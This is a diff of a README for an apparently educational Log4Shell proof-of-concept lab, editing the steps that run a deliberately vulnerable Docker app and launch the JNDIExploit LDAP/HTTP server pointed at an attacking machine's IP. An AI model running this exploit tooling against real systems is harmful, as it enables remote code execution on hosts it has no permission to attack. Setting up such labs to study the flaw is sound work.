@@ -13,13 +13,13 @@ In this repository we have made and example vulnerable application and proof-of-
 ```bash
 cd log4shell-vulnerable-app
 sudo docker run --rm -it -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-cd ..
 ```
 
 #### Step 2 : Run the LDAP Server and Http Server
 
 ```bash
 cd Log4shell_JNDIExploit
+unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <Your Attacking Machine IP>
 ```
 
